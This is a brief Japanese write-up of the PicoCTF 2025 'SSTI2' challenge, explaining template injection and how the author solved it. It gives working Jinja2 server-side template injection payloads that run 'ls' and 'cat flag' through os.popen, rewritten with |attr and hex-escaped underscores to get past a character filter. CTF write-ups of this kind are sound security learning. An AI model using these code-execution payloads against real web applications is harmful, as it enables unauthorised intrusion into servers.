PicoCTF 2025　SSTI2

SSTIとは、テンプレートインジェクションのこと
```
テンプレートエンジン: データの表示場所を埋め込んだhtmlなどのテンプレートに対して、適切に変数の中身を埋め込んで出力するエンジン
この機能を悪用し、悪意ある文字列を入力することで、意図しない変数の中身を表示したり、RCEを起こしたりする脆弱性。
クライアント側かサーバ側かで2通りある。
・SSTI: Server-Side Template Injection, Server-Sideでテンプレートエンジンを動かして色々やる
・CSTI: Client-Side Template Injection, Client-Sideでテンプレートエンジンを動かして色々やる
```
https://github.com/DiogoMRSilva/websitesVulnerableToSSTI
ここにいろいろリスト化されているので、どのテンプレートエンジンを使っているかを特定する

Jinja2だとわかったので、それに向けた攻撃を行う

[]　.　_が使えない状態だったので、
```
{{request.application.__globals__.__builtins__.__import__('os').popen('ls').read()}}
```
というコマンドを
```
{{ request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('ls')|attr('read')() }}
```
に変換


これでファイルの位置がわかるので、catで表示させる
```
{{request.application.__globals__.__builtins__.__import__('os').popen('cat flag').read()}}
```
を変換させて
```
{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('cat flag')|attr('read')()}}
```
とするとフラグを得ることができる。
くわしいことは <#1421031496545996873> 参照

参考
https://onsecurity.io/article/server-side-template-injection-with-jinja2/
https://qiita.com/NF0000/items/6d8526065eee4cd89bf6
https://zenn.dev/claustra01/articles/733856e685bd54#ssti2-%5B200pt%5D
https://zenn.dev/tetsurou/articles/8aead514a144fe#ssti2---200pt